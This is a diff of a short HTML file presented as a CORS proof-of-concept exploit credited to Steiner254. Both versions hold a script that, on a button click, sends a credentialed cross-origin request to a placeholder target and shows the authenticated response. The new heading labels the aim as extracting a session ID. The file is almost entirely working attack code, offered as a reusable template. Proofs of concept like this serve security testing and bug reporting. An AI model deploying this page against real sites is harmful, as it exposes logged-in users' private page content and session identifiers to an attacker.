@@ -1,27 +1,24 @@
 <!DOCTYPE html>
 <html>
-   <head>
-      <script>
-         function cors() {
-	        var xhttp = new XMLHttpRequest();
-		        xhttp.onreadystatechange = function() {
-			        if (this.readyState == 4 && this.status == 200) {
-			        	document.getElementById("emo").innerHTML = alert(this.responseText);
-	        }
-         };
-         xhttp.open("GET", "https://target.com/", true);
-         xhttp.withCredentials = true;
-         xhttp.send();
-         }
-      </script>
-   </head>
-   <body>
-      <center>
-      <h2>CORS PoC Exploit </h2>
-      <h3>created by <a href="https://twitter.com/steiner254">@Steiner254</a></h3>
-      <h3>Show full content of page</h3>
-      <div id="demo">
-         <button type="button" onclick="cors()">Exploit</button>
-      </div>
-   </body>
+<body>
+ <center>
+ <h2>CORS POC Exploit by Steiner254</h2>
+ <h3>Extract SID</h3>
+ <div id="demo">
+ <button type="button" onclick="cors()">Exploit Click here</button>
+ </div>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+};
+xhttp.open("GET", "https://target.com/", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
 </html>
